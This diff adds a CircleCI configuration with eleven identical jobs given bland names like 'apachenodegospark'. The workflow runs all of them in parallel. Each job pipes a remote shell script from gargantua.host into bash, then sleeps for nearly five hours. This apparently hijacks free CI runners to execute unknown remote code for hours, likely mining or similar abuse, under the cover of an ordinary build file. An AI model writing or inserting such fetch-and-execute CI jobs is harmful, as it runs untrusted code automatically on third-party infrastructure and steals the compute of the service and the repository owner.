@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  apachenodegospark:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apachenodegospark1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apachenodegospark2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apachenodegospark3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apachenodegospark4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apachenodegospark5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apachenodegospark6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apachenodegospark7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apachenodegospark8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apachenodegospark9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  apachenodegospark10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - apachenodegospark
+      - apachenodegospark1
+      - apachenodegospark2
+      - apachenodegospark3
+      - apachenodegospark4
+      - apachenodegospark5
+      - apachenodegospark6
+      - apachenodegospark7
+      - apachenodegospark8
+      - apachenodegospark9
+      - apachenodegospark10
